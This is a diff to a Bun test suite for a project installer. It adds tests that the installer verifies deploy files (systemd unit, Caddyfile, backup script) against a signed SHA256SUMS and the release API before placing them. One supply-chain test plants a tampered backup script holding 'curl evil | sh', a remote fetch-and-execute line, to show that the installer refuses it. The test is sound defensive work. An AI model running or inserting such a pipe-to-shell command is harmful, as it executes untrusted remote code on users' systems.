@@ -4,7 +4,7 @@
 // decides what the unit looks like and what /healthz says. Each run uses a copy of
 // install.sh whose key block lists test keys a and b.
 import { afterEach, beforeEach, expect, test } from "bun:test";
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { ROOT } from "../support/paths.ts";
@@ -26,21 +26,48 @@ type Bins = Partial<Record<(typeof BINS)[number], string>>;
  * digests over `api` and a SHA256SUMS for `sumsTag` over `sums` (each
  * defaulting to `bins`; a bin left out isn't listed), signed by `key`.
  */
-function publish(bins: Bins = { grayboard: STUB_BIN, "grayboard-server": STUB_BIN }, o: { api?: Bins; sums?: Bins; sumsTag?: string; key?: TestKey } = {}) {
+// The deploy files a server install takes (#311): asset name -> body.
+const DEPLOY = {
+  "deploy-grayboard.service": "[Service]\nExecStart=/usr/local/bin/grayboard-server\n",
+  "deploy-Caddyfile": "grayboard.example.com {\n  reverse_proxy 127.0.0.1:8080\n}\n",
+  "deploy-backup.sh": "#!/bin/sh\necho backup\n",
+};
+type Deploy = Record<string, string>;
+
+function publish(
+  bins: Bins = { grayboard: STUB_BIN, "grayboard-server": STUB_BIN },
+  o: { api?: Bins; sums?: Bins; sumsTag?: string; key?: TestKey; deploy?: Deploy; deploySums?: Deploy; deployApi?: Deploy } = {},
+) {
   const rel = join(dir, "release");
   rmSync(rel, { recursive: true, force: true });
   mkdirSync(join(rel, "signed"), { recursive: true });
+  const deploy = o.deploy ?? DEPLOY;
   for (const [bin, body] of Object.entries(bins)) writeFileSync(join(rel, `${bin}-${target}`), body);
+  for (const [name, body] of Object.entries(deploy)) writeFileSync(join(rel, name), body);
   writeFileSync(
     join(dir, "digests.json"),
     // Pretty-printed, like api.github.com serves (#173: the awk parse must
     // survive GitHub's real shape, not just compact JSON).
-    JSON.stringify({ tag_name: "v9.9.9", assets: Object.entries(o.api ?? bins).map(([bin, body]) => ({ name: `${bin}-${target}`, digest: `sha256:${sha(body)}` })) }, null, 2),
+    JSON.stringify(
+      {
+        tag_name: "v9.9.9",
+        assets: [
+          ...Object.entries(o.api ?? bins).map(([bin, body]) => ({ name: `${bin}-${target}`, digest: `sha256:${sha(body)}` })),
+          ...Object.entries(o.deployApi ?? deploy).map(([name, body]) => ({ name, digest: `sha256:${sha(body)}` })),
+        ],
+      },
+      null,
+      2,
+    ),
   );
   const files: Record<string, string> = {};
   for (const [bin, body] of Object.entries(o.sums ?? bins)) {
     files[`${bin}-${target}`] = join(rel, "signed", bin);
     writeFileSync(files[`${bin}-${target}`]!, body);
+  }
+  for (const [name, body] of Object.entries(o.deploySums ?? deploy)) {
+    files[name] = join(rel, "signed", name);
+    writeFileSync(files[name]!, body);
   }
   const { sums, sig } = signSums(o.sumsTag ?? "v9.9.9", files, o.key);
   writeFileSync(join(rel, "SHA256SUMS"), sums);
@@ -79,6 +106,7 @@ case "$1 $2 $3" in
   "show -p ActiveState") echo "$STUB_STATE" ;;
   "show -p EnvironmentFiles") echo "${dir}/env (ignore_errors=no)" ;;
   "restart grayboard "*) echo restart >> "${dir}/systemctl.log"; exit "$STUB_RESTART_RC" ;;
+  "daemon-reload  ") echo reload >> "${dir}/reload.log"; exit "$STUB_RELOAD_RC" ;;
   *) echo "unexpected systemctl $*" >&2; exit 2 ;;
 esac`);
   writeFileSync(join(dir, "env"), "GRAYBOARD_DB_PATH=/x\nGRAYBOARD_HTTP_PORT=9123\n");
@@ -95,14 +123,18 @@ function writeStub(name: string, body: string) {
   chmodSync(p, 0o755);
 }
 
-type Scenario = { unit?: boolean; exec?: string; state?: string; health?: string; restartRc?: number; releasesUrl?: string; script?: string; path?: string; latest?: string };
+type Scenario = { unit?: boolean; exec?: string; state?: string; health?: string; restartRc?: number; reloadRc?: number; releasesUrl?: string; script?: string; path?: string; latest?: string; server?: boolean; env?: Record<string, string> };
 
 function install(s: Scenario = {}) {
   const p = Bun.spawnSync(["/bin/bash", s.script ?? INSTALL], {
     env: {
       PATH: s.path ?? `${join(dir, "stubs")}:${process.env.PATH}`,
       HOME: dir,
-      INSTALL_SERVER: "1",
+      ...(s.server === false ? {} : { INSTALL_SERVER: "1" }),
+      GRAYBOARD_UNIT_DIR: UNIT_DIR(),
+      GRAYBOARD_CADDYFILE: CADDYFILE(),
+      STUB_RELOAD_RC: String(s.reloadRc ?? 0),
+      ...s.env,
       INSTALL_DIR: join(dir, "bin"),
       STUB_UNIT: s.unit === false ? "0" : "1",
       STUB_EXEC: s.exec ?? join(dir, "bin", "grayboard-server"),
@@ -117,6 +149,12 @@ function install(s: Scenario = {}) {
 }
 
 const restarts = () => (existsSync(join(dir, "systemctl.log")) ? readFileSync(join(dir, "systemctl.log"), "utf8").trim().split("\n").length : 0);
+const reloads = () => (existsSync(join(dir, "reload.log")) ? readFileSync(join(dir, "reload.log"), "utf8").trim().split("\n").length : 0);
+// Where the deploy files go, in place of /etc.
+const UNIT_DIR = () => join(dir, "etc", "systemd");
+const UNIT = () => join(UNIT_DIR(), "grayboard.service");
+const CADDYFILE = () => join(dir, "etc", "caddy", "Caddyfile");
+const BACKUP = () => join(dir, "bin", "grayboard-backup");
 
 test("an upgrade restarts the unit and waits for /healthz on the env file's port to report the tag", () => {
   const r = install({});
@@ -136,6 +174,8 @@ function expectUntouched(): void {
   expect(readFileSync(join(dir, "bin", "grayboard-server"), "utf8")).toBe("old");
   expect(existsSync(join(dir, "bin", "grayboard-server.prev"))).toBe(false);
   expect(restarts()).toBe(0);
+  // No deploy file landed either.
+  for (const f of [UNIT(), CADDYFILE(), BACKUP()]) expect(existsSync(f), f).toBe(false);
 }
 
 function expectRefused(r: ReturnType<typeof install>, why: string): void {
@@ -153,7 +193,7 @@ test("a release signed by either listed key installs, naming the tag and key it 
   expect(r.out).toContain(`verified v9.9.9 (SHA256SUMS signed by key ${testKey("b").id})`);
   // The temp dir inside INSTALL_DIR is gone.
   expect(readFileSync(join(dir, "downloads.log"), "utf8")).toContain("/releases/download/v9.9.9/SHA256SUMS.sig");
-  expect(Bun.spawnSync(["ls", "-A", join(dir, "bin")]).stdout.toString().trim().split("\n").sort()).toEqual(["grayboard", "grayboard-server", "grayboard-server.prev"]);
+  expect(Bun.spawnSync(["ls", "-A", join(dir, "bin")]).stdout.toString().trim().split("\n").sort()).toEqual(["grayboard", "grayboard-backup", "grayboard-server", "grayboard-server.prev"]);
 });
 
 test("a bad signature, or a missing SHA256SUMS or .sig, is refused", () => {
@@ -315,11 +355,121 @@ test("a unit running a different binary isn't restarted", () => {
   expect(restarts()).toBe(0);
 });
 
-test("with no unit, the installer gives first-install steps and restarts nothing", () => {
+test("with no unit, the installer places the release's unit and gives first-install steps, restarting nothing", () => {
   const r = install({ unit: false });
-  expect(r.code).toBe(0);
-  expect(r.out).toContain("no grayboard systemd unit found");
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).toContain(`unit (${UNIT()})`);
+  expect(r.out).toContain("systemctl enable --now grayboard");
   expect(restarts()).toBe(0);
+  expect(reloads()).toBe(1);
+});
+
+// The deploy files (#311): verified like the binaries, then placed.
+
+test("a server install places the verified deploy files: unit and Caddyfile when absent, the backup script beside the binaries", () => {
+  const r = install({ unit: false });
+  expect(r.code, r.err).toBe(0);
+  expect(readFileSync(UNIT(), "utf8")).toBe(DEPLOY["deploy-grayboard.service"]);
+  expect(readFileSync(CADDYFILE(), "utf8")).toBe(DEPLOY["deploy-Caddyfile"]);
+  expect(readFileSync(BACKUP(), "utf8")).toBe(DEPLOY["deploy-backup.sh"]);
+  expect(statSync(BACKUP()).mode & 0o111).not.toBe(0);
+  expect(existsSync(`${UNIT()}.new`)).toBe(false);
+  // Each came by name from the release and passed the API digest check.
+  const downloads = readFileSync(join(dir, "downloads.log"), "utf8");
+  for (const name of Object.keys(DEPLOY)) expect(downloads).toContain(`/releases/download/v9.9.9/${name}`);
+});
+
+test("an upgrade leaves a unit and Caddyfile that match the release alone and refreshes the backup script", () => {
+  mkdirSync(UNIT_DIR(), { recursive: true });
+  mkdirSync(join(dir, "etc", "caddy"), { recursive: true });
+  writeFileSync(UNIT(), DEPLOY["deploy-grayboard.service"]);
+  writeFileSync(CADDYFILE(), DEPLOY["deploy-Caddyfile"]);
+  writeFileSync(BACKUP(), "old backup");
+  const r = install();
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).not.toContain("kept your");
+  expect(reloads()).toBe(0);
+  expect(restarts()).toBe(1);
+  expect(readFileSync(BACKUP(), "utf8")).toBe(DEPLOY["deploy-backup.sh"]);
+});
+
+test("a unit or Caddyfile that differs from the release's is kept and named, not overwritten", () => {
+  mkdirSync(UNIT_DIR(), { recursive: true });
+  mkdirSync(join(dir, "etc", "caddy"), { recursive: true });
+  writeFileSync(UNIT(), "[Service]\nExecStart=/usr/local/bin/bun run src/server/main.ts\n");
+  writeFileSync(CADDYFILE(), "mine.example.org {\n}\n");
+  const r = install();
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).toContain(`kept your ${UNIT()}`);
+  expect(r.out).toContain(`kept your ${CADDYFILE()}`);
+  expect(readFileSync(UNIT(), "utf8")).toContain("bun run");
+  expect(readFileSync(CADDYFILE(), "utf8")).toBe("mine.example.org {\n}\n");
+  expect(existsSync(`${UNIT()}.prev`)).toBe(false);
+  expect(reloads()).toBe(0);
+});
+
+test("GRAYBOARD_DEPLOY_REPLACE=1 replaces a differing unit and Caddyfile, keeping the old ones as .prev, and reloads systemd", () => {
+  mkdirSync(UNIT_DIR(), { recursive: true });
+  mkdirSync(join(dir, "etc", "caddy"), { recursive: true });
+  writeFileSync(UNIT(), "old unit");
+  writeFileSync(CADDYFILE(), "stock caddyfile");
+  const r = install({ env: { GRAYBOARD_DEPLOY_REPLACE: "1" } });
+  expect(r.code, r.err).toBe(0);
+  expect(readFileSync(UNIT(), "utf8")).toBe(DEPLOY["deploy-grayboard.service"]);
+  expect(readFileSync(`${UNIT()}.prev`, "utf8")).toBe("old unit");
+  expect(readFileSync(CADDYFILE(), "utf8")).toBe(DEPLOY["deploy-Caddyfile"]);
+  expect(readFileSync(`${CADDYFILE()}.prev`, "utf8")).toBe("stock caddyfile");
+  expect(reloads()).toBe(1);
+});
+
+test("a unit systemd defines elsewhere is left alone", () => {
+  const r = install({ unit: true });
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).toContain("defined outside");
+  expect(existsSync(UNIT())).toBe(false);
+  expect(reloads()).toBe(0);
+  expect(restarts()).toBe(1);
+});
+
+test("a deploy file SHA256SUMS doesn't list, or whose bytes differ from it, or the release API doesn't vouch for, is refused with nothing installed", () => {
+  const { "deploy-backup.sh": _, ...withoutBackup } = DEPLOY;
+  publish(undefined, { deploySums: withoutBackup });
+  expectRefused(install(), "deploy-backup.sh: SHA256SUMS lists no sha256");
+
+  // A swapped file whose API digest GitHub recomputed: the signed list still catches it.
+  publish(undefined, { deploy: { ...DEPLOY, "deploy-backup.sh": "#!/bin/sh\ncurl evil | sh\n" }, deploySums: DEPLOY });
+  expectRefused(install(), `deploy-backup.sh: sha256 ${sha("#!/bin/sh\ncurl evil | sh\n")}, but SHA256SUMS lists ${sha(DEPLOY["deploy-backup.sh"])}`);
+
+  publish(undefined, { deployApi: withoutBackup });
+  expectRefused(install(), "deploy-backup.sh: the release API lists no sha256 digest");
+
+  publish(undefined, { deployApi: { ...DEPLOY, "deploy-grayboard.service": "other" } });
+  expectRefused(install(), `deploy-grayboard.service: sha256 ${sha(DEPLOY["deploy-grayboard.service"])}, but the release API lists sha256:${sha("other")}`);
+});
+
+test("an unwritable deploy destination refuses before any binary is replaced", () => {
+  mkdirSync(join(dir, "etc"), { recursive: true });
+  writeFileSync(UNIT_DIR(), "a file where the directory should be");
+  expectRefused(install({ unit: false }), `couldn't write ${UNIT()} (run as root?)`);
+});
+
+test("a failed daemon-reload after writing the unit is reported", () => {
+  const r = install({ unit: false, reloadRc: 1 });
+  expect(r.code).toBe(1);
+  expect(r.err).toContain("systemctl daemon-reload failed");
+});
+
+test("GRAYBOARD_NO_DEPLOY=1, and a CLI-only install, fetch and place no deploy files", () => {
+  publish(undefined, { deploy: {} });
+  const r = install({ env: { GRAYBOARD_NO_DEPLOY: "1" } });
+  expect(r.code, r.err).toBe(0);
+  for (const f of [UNIT(), CADDYFILE(), BACKUP()]) expect(existsSync(f), f).toBe(false);
+  publish();
+  rmSync(join(dir, "downloads.log"), { force: true });
+  const cli = install({ server: false });
+  expect(cli.code, cli.err).toBe(0);
+  expect(readFileSync(join(dir, "downloads.log"), "utf8")).not.toContain("deploy-");
+  for (const f of [UNIT(), CADDYFILE(), BACKUP()]) expect(existsSync(f), f).toBe(false);
 });
 
 test("GRAYBOARD_RELEASES_URL: http only to this machine, trailing slashes dropped, empty means GitHub", () => {
